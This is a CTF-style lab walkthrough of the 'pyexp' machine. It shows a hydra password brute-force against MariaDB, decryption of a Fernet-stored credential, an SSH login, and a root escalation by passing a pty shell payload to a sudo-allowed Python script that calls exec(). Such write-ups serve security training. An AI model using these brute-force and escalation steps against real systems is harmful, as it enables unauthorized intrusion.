---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/pyexp-1,534/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

As usual we start with a simple port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.159.118
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 20:46 CEST
Nmap scan report for 192.168.159.118
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
1337/tcp open  waste
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 29.18 seconds

$ nmap -Pn -p1337,3306 -sV 192.168.159.118
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 20:48 CEST
Nmap scan report for 192.168.159.118
Host is up (0.026s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
```

---

# exploitation
## `mariadb` weak password
```bash
$ hydra -I -V -l root -P /usr/share/wordlists/rockyou.txt 192.168.159.118 mysql
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-29 20:56:51
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.159.118:3306/
[ATTEMPT] target 192.168.159.118 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 192.168.159.118 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 192.168.159.118 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 192.168.159.118 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
...
[3306][mysql] host: 192.168.159.118   login: root   password: prettywoman
```

> We got credentials! `root:prettywoman`
{: .prompt-info}

Digging through the database.
```bash
$ mysql -h 192.168.159.118 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5082
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.026 sec)

MariaDB [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.025 sec)

MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.027 sec)
```

> Googling `fernet cred` shows that `fernet` is a symmetric encryption algorithm. As we  seem to have a cipher text and a key we are able to decrypt the cipher text with the following python script.
{: .prompt-info}

```python
from cryptography.fernet import Fernet

key = 'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0='
f = Fernet(key)
token = f.decrypt(b"gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=")

print(token)
```

Execute the script
```bash
$ python3 fernet.py
b'lucy:wJ9`"Lemdv9[FEw-'
```

> We got credentials!
{: .prompt-info}

Lets try to login via `ssh`.
```bash
$ ssh lucy@192.168.159.118 -p 1337
The authenticity of host '[192.168.159.118]:1337 ([192.168.159.118]:1337)' can't be established.
ED25519 key fingerprint is SHA256:K18aoM62L+/GHVzkZJScoh+S91IW1EPPvsc1K7UuVbE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.159.118]:1337' (ED25519) to the list of known hosts.
lucy@192.168.159.118's password: 
Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
lucy@pyexp:~$ id
uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

> We got `ssh` access :)
{: .prompt-info}

---

# post exploitation
## get first flag
```bash
lucy@pyexp:~$ ls
local.txt  user.txt
lucy@pyexp:~$ cat local.txt 
e******************************4
```

## privilege escalation
We start by checking `sudo` privileges.
```bash
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

> We are allowed to execute `python2` with the parameter `/opt/exp.py`
{: .prompt-info}

Lets have a look what `/opt/exp.py` does.
```python
uinput = raw_input('how are you?')
exec(uinput)
```

> The `exec()` method is juicy! We can execute our own `python` code through it :)
{: .prompt-info}

Payload to get a shell: `import pty;pty.spawn("/bin/bash")`  
  
Lets escalate!
```bash
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
how are you?import pty;pty.spawn("/bin/bash")
root@pyexp:/home/lucy# id
uid=0(root) gid=0(root) groups=0(root)
```

> We are `root`!
{: .prompt-info}

## get second flag
```bash
root@pyexp:/home/lucy# cd /root/
root@pyexp:~# ls
proof.txt  root.txt
root@pyexp:~# cat proof.txt 
6******************************f
```

Pwned! <@:-)
